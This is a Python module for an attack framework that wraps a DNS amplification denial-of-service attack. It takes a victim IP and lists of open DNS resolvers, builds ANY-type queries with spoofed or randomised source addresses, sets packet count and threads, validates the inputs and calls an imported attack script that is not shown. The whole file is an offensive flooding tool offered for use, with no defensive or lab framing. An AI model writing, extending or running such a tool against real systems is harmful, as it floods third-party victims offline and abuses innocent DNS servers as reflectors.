"""DNS Amplification attack implementation"""

import argparse
import sys
import os
import netifaces
from typing import Optional, Dict, Any, List
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class DnsAmplification(AttackBase):
    """DNS Amplification attack implementation"""
    
    name = "dns-amplification"
    description = "Perform DNS amplification attack"
    
    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        # Target configuration
        target_group = parser.add_argument_group('Target Configuration')
        target_group.add_argument('--target', required=True, help='Target IP address')
        target_group.add_argument('--target-port', type=int, default=53, help='Target DNS port')
        
        # DNS Server configuration
        dns_group = parser.add_argument_group('DNS Server Configuration')
        dns_group.add_argument('--dns-server', required=True, help='DNS server to use for amplification')
        dns_group.add_argument('--dns-port', type=int, default=53, help='DNS server port')
        dns_group.add_argument('--dns-servers-file', help='File containing list of DNS servers (one per line)')
        dns_group.add_argument('--query-domain', required=True, help='Domain to query')
        dns_group.add_argument('--query-type', default='ANY', help='DNS query type (e.g., ANY, A, AAAA, TXT)')
        dns_group.add_argument('--recursive', action='store_true', help='Enable recursive queries')
        
        # Network configuration
        net_group = parser.add_argument_group('Network Configuration')
        net_group.add_argument('--interface', help='Network interface to use')
        net_group.add_argument('--source-ip', help='Source IP address for packets (random if not specified)')
        net_group.add_argument('--source-port', type=int, help='Source port for packets (random if not specified)')
        net_group.add_argument('--randomize-source', action='store_true', help='Randomize source IP for each packet')
        
        # Attack behavior
        behavior_group = parser.add_argument_group('Attack Behavior')
        behavior_group.add_argument('--count', type=int, default=1000, help='Number of packets to send')
        behavior_group.add_argument('--interval', type=float, default=0.1, help='Time interval between packets (seconds)')
        behavior_group.add_argument('--threads', type=int, default=1, help='Number of threads to use')
        behavior_group.add_argument('--rotate-dns', action='store_true', help='Rotate through DNS servers if multiple provided')
        behavior_group.add_argument('--amplification-threshold', type=float, default=1.0, 
                                  help='Minimum response/request size ratio to consider successful')
        
        # Monitoring and output
        monitor_group = parser.add_argument_group('Monitoring')
        monitor_group.add_argument('--packet-log', help='Log file for sent packets')
        monitor_group.add_argument('--stats-interval', type=float, default=1.0, help='Interval for printing statistics')
        monitor_group.add_argument('--verify-amplification', action='store_true', 
                                 help='Verify amplification factor before attack')
        monitor_group.add_argument('--silent', action='store_true', help='Suppress non-error output')
        
    def validate(self, args: argparse.Namespace) -> bool:
        # Validate target configuration
        if not self.validator.validate_ip(args.target, allow_private=True, allow_loopback=False):
            logger.error(f"Invalid target IP address: {args.target}")
            return False
        if not self.validator.validate_port(args.target_port):
            logger.error(f"Invalid target port: {args.target_port}")
            return False
            
        # Validate DNS server configuration
        dns_servers: List[str] = [args.dns_server]
        if args.dns_servers_file:
            if not self.validator.validate_file_path(args.dns_servers_file, check_readable=True):
                logger.error(f"Invalid DNS servers file: {args.dns_servers_file}")
                return False
            try:
                with open(args.dns_servers_file, 'r') as f:
                    dns_servers.extend([line.strip() for line in f if line.strip()])
            except Exception as e:
                logger.error(f"Failed to read DNS servers file: {str(e)}")
                return False
                
        for server in dns_servers:
            if not self.validator.validate_ip(server):
                logger.error(f"Invalid DNS server IP address: {server}")
                return False
                
        if not self.validator.validate_port(args.dns_port):
            logger.error(f"Invalid DNS server port: {args.dns_port}")
            return False
            
        # Validate domain and query type
        if not self.validator.validate_domain(args.query_domain):
            logger.error(f"Invalid query domain: {args.query_domain}")
            return False
            
        valid_query_types = {'A', 'AAAA', 'ANY', 'TXT', 'MX', 'NS', 'SOA'}
        if args.query_type.upper() not in valid_query_types:
            logger.error(f"Invalid query type: {args.query_type}. Must be one of {valid_query_types}")
            return False
            
        # Validate network configuration
        if args.interface and not self.validator.validate_interface(args.interface):
            logger.error(f"Invalid interface: {args.interface}")
            return False
            
        if args.source_ip and not self.validator.validate_ip(args.source_ip):
            logger.error(f"Invalid source IP address: {args.source_ip}")
            return False
            
        if args.source_port and not self.validator.validate_port(args.source_port):
            logger.error(f"Invalid source port: {args.source_port}")
            return False
            
        # Validate packet log file if specified
        if args.packet_log and not self.validator.validate_file_path(
            args.packet_log,
            check_exists=False,
            check_readable=False
        ):
            logger.error(f"Invalid packet log file path: {args.packet_log}")
            return False
            
        # Validate numeric parameters
        if args.count <= 0:
            logger.error(f"Invalid packet count: {args.count}")
            return False
        if args.interval <= 0:
            logger.error(f"Invalid interval: {args.interval}")
            return False
        if args.threads <= 0:
            logger.error(f"Invalid thread count: {args.threads}")
            return False
        if args.stats_interval <= 0:
            logger.error(f"Invalid statistics interval: {args.stats_interval}")
            return False
        if args.amplification_threshold <= 0:
            logger.error(f"Invalid amplification threshold: {args.amplification_threshold}")
            return False
            
        return True
        
    def run(self, args: argparse.Namespace) -> None:
        # Import the original attack script
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        attack_path = os.path.join(scripts_dir, 'dns_amplification')
        
        sys.path.insert(0, attack_path)
        try:
            import dns_amplification as attack_script
            
            # Create attack configuration
            config = {
                'target_ip': args.target,
                'dns_server': args.dns_server,
                'query_domain': args.query_domain,
                'packet_count': args.count,
                'interval': args.interval
            }
            
            # Run the attack
            logger.info(f"Running DNS amplification attack against {args.target} using {args.dns_server}")
            attack_script.run_attack(config)
            
        except ImportError:
            logger.error("Failed to import DNS amplification attack script")
            raise
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
            raise
        finally:
            sys.path.remove(attack_path)
